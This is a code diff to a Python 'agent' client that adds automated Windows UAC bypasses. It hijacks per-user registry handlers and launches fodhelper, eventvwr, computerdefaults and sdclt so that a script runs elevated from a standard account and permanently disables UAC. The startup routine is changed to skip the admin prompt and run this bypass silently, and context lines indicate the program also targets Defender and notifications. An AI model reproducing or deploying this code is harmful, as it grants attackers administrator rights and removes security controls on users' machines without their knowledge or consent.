@@ -4822,6 +4822,266 @@ def silent_disable_uac_method4():
         debug_print(f"❌ [UAC DISABLE] Method 4 FAILED: {e}")
         return False
 
+def bootstrap_uac_disable_no_admin():
+    """
+    BOOTSTRAP METHOD: Disable UAC WITHOUT needing admin privileges!
+    
+    Strategy:
+    1. Use UAC bypass techniques (fodhelper, eventvwr, etc.) to gain admin
+    2. The elevated process then disables UAC permanently
+    3. All happens automatically with ZERO password prompts!
+    
+    This works from a STANDARD USER account!
+    """
+    if not WINDOWS_AVAILABLE:
+        debug_print("[BOOTSTRAP] Not Windows - skipping")
+        return False
+    
+    debug_print("=" * 80)
+    debug_print("[BOOTSTRAP] UAC DISABLE WITHOUT ADMIN PRIVILEGES!")
+    debug_print("[BOOTSTRAP] Using UAC bypass to gain admin, then disable UAC")
+    debug_print("=" * 80)
+    
+    # Check if already admin
+    if is_admin():
+        debug_print("[BOOTSTRAP] Already admin - proceeding directly to UAC disable")
+        return silent_disable_uac()
+    
+    # Not admin - use UAC bypass to elevate
+    debug_print("[BOOTSTRAP] Not admin - using UAC bypass methods to elevate...")
+    debug_print("[BOOTSTRAP] This works WITHOUT password from standard user account!")
+    
+    # Create a script that will run elevated and disable UAC
+    disable_uac_script = f'''
+import sys
+import os
+
+# Add parent directory to path to import from client.py
+sys.path.insert(0, r"{os.path.dirname(os.path.abspath(__file__))}")
+
+# Set environment flag to indicate we're in elevated mode
+os.environ['ELEVATED_MODE'] = '1'
+
+try:
+    # Import and run UAC disable
+    import client
+    result = client.silent_disable_uac()
+    
+    if result:
+        print("\\n[ELEVATED] UAC disabled successfully!")
+        print("[ELEVATED] Restart required for changes to take effect")
+    else:
+        print("\\n[ELEVATED] UAC disable failed")
+    
+    # Exit elevated process
+    sys.exit(0 if result else 1)
+except Exception as e:
+    print(f"[ELEVATED] Error: {{e}}")
+    import traceback
+    traceback.print_exc()
+    sys.exit(1)
+'''
+    
+    # Save script to temp location
+    import tempfile
+    script_path = os.path.join(tempfile.gettempdir(), "uac_disable_elevated.py")
+    
+    try:
+        with open(script_path, 'w') as f:
+            f.write(disable_uac_script)
+        debug_print(f"[BOOTSTRAP] Created elevation script: {script_path}")
+    except Exception as e:
+        debug_print(f"[BOOTSTRAP] Failed to create script: {e}")
+        return False
+    
+    # Try UAC bypass methods to run the script elevated
+    debug_print("\n[BOOTSTRAP] Attempting UAC bypass methods...")
+    
+    # Use the UAC Manager to try all bypass methods
+    try:
+        manager = get_uac_manager()
+        debug_print(f"[BOOTSTRAP] UAC Manager loaded with {len(manager.methods)} methods")
+        
+        # Temporarily modify the executable path to run our script
+        original_file = __file__
+        
+        # Try each bypass method with our elevation script
+        for method_name in manager.get_available_methods():
+            try:
+                debug_print(f"\n[BOOTSTRAP] Trying UAC bypass: {method_name}")
+                method = manager.methods[method_name]
+                
+                # Get the method's executable command
+                elevated_cmd = f'python.exe "{script_path}"'
+                
+                # Execute the bypass with our script
+                if method_name == 'fodhelper':
+                    result = bootstrap_fodhelper_bypass(elevated_cmd)
+                elif method_name == 'eventvwr':
+                    result = bootstrap_eventvwr_bypass(elevated_cmd)
+                elif method_name == 'computerdefaults':
+                    result = bootstrap_computerdefaults_bypass(elevated_cmd)
+                elif method_name == 'sdclt':
+                    result = bootstrap_sdclt_bypass(elevated_cmd)
+                else:
+                    continue
+                
+                if result:
+                    debug_print(f"[BOOTSTRAP] ✅ UAC bypass '{method_name}' succeeded!")
+                    debug_print("[BOOTSTRAP] Elevated process should now be disabling UAC...")
+                    time.sleep(5)  # Wait for elevated process
+                    
+                    # Check if UAC was disabled
+                    status = verify_uac_status()
+                    if status and status['is_fully_disabled']:
+                        debug_print("=" * 80)
+                        debug_print("✅✅✅ [BOOTSTRAP] SUCCESS!")
+                        debug_print("✅ UAC disabled WITHOUT needing admin password!")
+                        debug_print("✅ All done from standard user account!")
+                        debug_print("=" * 80)
+                        
+                        # Cleanup
+                        try:
+                            os.remove(script_path)
+                        except:
+                            pass
+                        
+                        return True
+                
+            except Exception as e:
+                debug_print(f"[BOOTSTRAP] Method '{method_name}' failed: {e}")
+                continue
+        
+        debug_print("[BOOTSTRAP] All UAC bypass methods failed")
+        
+    except Exception as e:
+        debug_print(f"[BOOTSTRAP] UAC Manager error: {e}")
+    
+    # Cleanup
+    try:
+        os.remove(script_path)
+    except:
+        pass
+    
+    debug_print("=" * 80)
+    debug_print("❌ [BOOTSTRAP] Could not gain admin via UAC bypass")
+    debug_print("❌ Falling back to standard UAC disable (requires admin)")
+    debug_print("=" * 80)
+    
+    # Fallback to regular method
+    return silent_disable_uac()
+
+def bootstrap_fodhelper_bypass(command):
+    """Bootstrap UAC bypass using fodhelper.exe"""
+    try:
+        import winreg
+        key_path = r"Software\Classes\ms-settings\Shell\Open\command"
+        
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command)
+        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+        winreg.CloseKey(key)
+        
+        # Execute fodhelper
+        subprocess.Popen([r"C:\Windows\System32\fodhelper.exe"],
+                        creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        time.sleep(3)
+        
+        # Cleanup
+        try:
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+        except:
+            pass
+        
+        return True
+    except Exception as e:
+        debug_print(f"[BOOTSTRAP] Fodhelper bypass error: {e}")
+        return False
+
+def bootstrap_eventvwr_bypass(command):
+    """Bootstrap UAC bypass using eventvwr.exe"""
+    try:
+        import winreg
+        key_path = r"Software\Classes\mscfile\shell\open\command"
+        
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command)
+        winreg.CloseKey(key)
+        
+        # Execute eventvwr
+        subprocess.Popen([r"C:\Windows\System32\eventvwr.exe"],
+                        creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        time.sleep(3)
+        
+        # Cleanup
+        try:
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+        except:
+            pass
+        
+        return True
+    except Exception as e:
+        debug_print(f"[BOOTSTRAP] EventVwr bypass error: {e}")
+        return False
+
+def bootstrap_computerdefaults_bypass(command):
+    """Bootstrap UAC bypass using computerdefaults.exe"""
+    try:
+        import winreg
+        key_path = r"Software\Classes\ms-settings\Shell\Open\command"
+        
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command)
+        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+        winreg.CloseKey(key)
+        
+        # Execute computerdefaults
+        subprocess.Popen([r"C:\Windows\System32\ComputerDefaults.exe"],
+                        creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        time.sleep(3)
+        
+        # Cleanup
+        try:
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+        except:
+            pass
+        
+        return True
+    except Exception as e:
+        debug_print(f"[BOOTSTRAP] ComputerDefaults bypass error: {e}")
+        return False
+
+def bootstrap_sdclt_bypass(command):
+    """Bootstrap UAC bypass using sdclt.exe"""
+    try:
+        import winreg
+        key_path = r"Software\Classes\Folder\shell\open\command"
+        
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command)
+        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+        winreg.CloseKey(key)
+        
+        # Execute sdclt
+        subprocess.Popen([r"C:\Windows\System32\sdclt.exe"],
+                        creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        time.sleep(3)
+        
+        # Cleanup
+        try:
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+        except:
+            pass
+        
+        return True
+    except Exception as e:
+        debug_print(f"[BOOTSTRAP] Sdclt bypass error: {e}")
+        return False
+
 def silent_disable_uac():
     """
     Silently disable UAC with ZERO popups - tries all methods until success.
@@ -4961,8 +5221,13 @@ def silent_enable_strict_uac():
 
 def disable_uac():
     """Disable UAC (User Account Control) by modifying registry settings."""
-    # This is the old function - now calls the new silent version
-    return silent_disable_uac()
+    # Try bootstrap method first (works without admin!)
+    if not is_admin():
+        debug_print("[UAC] Not admin - using bootstrap method (no password needed)")
+        return bootstrap_uac_disable_no_admin()
+    else:
+        debug_print("[UAC] Already admin - using direct method")
+        return silent_disable_uac()
 
 def toggle_uac(enable=False):
     """
@@ -12460,21 +12725,21 @@ if __name__ == "__main__":
     print("[STARTUP] Python Agent Starting...")
     print("[STARTUP] Initializing components...")
     
-    # PRIORITY 0: Request admin privileges (keep asking until YES)
+    # PRIORITY 0: OPTIONAL admin privileges (bootstrap method will handle it)
     if WINDOWS_AVAILABLE:
         print("=" * 80)
-        print("[STARTUP] PRIORITY 0: Requesting Administrator Privileges...")
-        print("[STARTUP] This is REQUIRED for the agent to function properly")
-        print("[STARTUP] The prompt will keep appearing until you click YES")
+        print("[STARTUP] PRIORITY 0: Checking Administrator Privileges...")
+        print("[STARTUP] NOTE: Admin is NOT required - bootstrap method will handle it!")
         print("=" * 80)
         
-        try:
-            # Keep asking for admin until user clicks YES
-            run_as_admin_persistent()
-        except Exception as e:
-            print(f"[STARTUP] Admin request error: {e}")
-            import traceback
-            traceback.print_exc()
+        if is_admin():
+            print("[STARTUP] ✅ Already running as Administrator")
+        else:
+            print("[STARTUP] ⚪ Running as Standard User")
+            print("[STARTUP] ✅ Bootstrap method will use UAC bypass to gain admin (no password needed!)")
+            print("[STARTUP] Skipping admin prompt - will use automatic UAC bypass instead")
+        
+        print("=" * 80)
     
     # PRIORITY 1: Disable WSL, UAC, Defender, and Notifications FIRST
     try:
@@ -12492,17 +12757,23 @@ if __name__ == "__main__":
         except Exception as e:
             print(f"[STARTUP] WSL routing error: {e}")
         
-        # 1. SILENT UAC DISABLE (tries all 4 methods!)
-        print("\n[STARTUP] Step 1: SILENT UAC DISABLE (All Methods)...")
-        print("[STARTUP] This will COMPLETELY DISABLE admin password popups!")
+        # 1. BOOTSTRAP UAC DISABLE (NO ADMIN NEEDED!)
+        print("\n[STARTUP] Step 1: BOOTSTRAP UAC DISABLE (NO ADMIN REQUIRED!)...")
+        print("[STARTUP] This uses UAC bypass to gain admin, then disables UAC!")
+        print("[STARTUP] Works from STANDARD USER account - NO PASSWORD NEEDED!")
         try:
-            if silent_disable_uac():
+            if bootstrap_uac_disable_no_admin():
                 print("[STARTUP] ✅✅✅ UAC DISABLED SUCCESSFULLY!")
+                print("[STARTUP] ✅ Used UAC bypass - NO ADMIN PASSWORD NEEDED!")
                 print("[STARTUP] ✅ Admin password popups are NOW DISABLED for ALL exe/installers!")
                 print("[STARTUP] ✅ You can now run ANY application without password prompts!")
             else:
-                print("[STARTUP] ⚠️ UAC disable failed - see debug output above")
-                print("[STARTUP] (May need to run as administrator first)")
+                print("[STARTUP] ⚠️ Bootstrap failed - trying direct method...")
+                # Fallback to direct method
+                if silent_disable_uac():
+                    print("[STARTUP] ✅ UAC disabled using direct method")
+                else:
+                    print("[STARTUP] ⚠️ UAC disable failed - may need to run as administrator")
         except Exception as e:
             print(f"[STARTUP] UAC disable error: {e}")
             import traceback
